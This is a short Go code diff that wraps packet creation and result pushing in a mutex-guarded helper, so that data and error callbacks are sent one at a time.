@@ -11,6 +11,7 @@ import (
 	"main/util"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 )
 
@@ -273,8 +274,7 @@ func DataProcess(callbackType int, b []byte) {
 			ErrorProcess(err)
 		}
 	}
-	finalPaket := MakePacket(callbackType, result)
-	_, err = PushResult(finalPaket)
+	_, err = criticalSection(callbackType, result)
 	if err != nil {
 		ErrorProcess(err)
 	}
@@ -286,8 +286,17 @@ func ErrorProcess(err error) {
 	arg2Bytes := WriteInt(0)
 	errMsgBytes := []byte(err.Error())
 	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
-	finalPaket := MakePacket(31, result)
-	PushResult(finalPaket)
+	criticalSection(31, result)
+}
+
+var mutex sync.Mutex
+
+func criticalSection(callbackType int, b []byte) ([]byte, error) {
+	mutex.Lock()
+	finalPaket := MakePacket(callbackType, b)
+	result, err := PushResult(finalPaket)
+	mutex.Unlock()
+	return result, err
 }
 
 /*
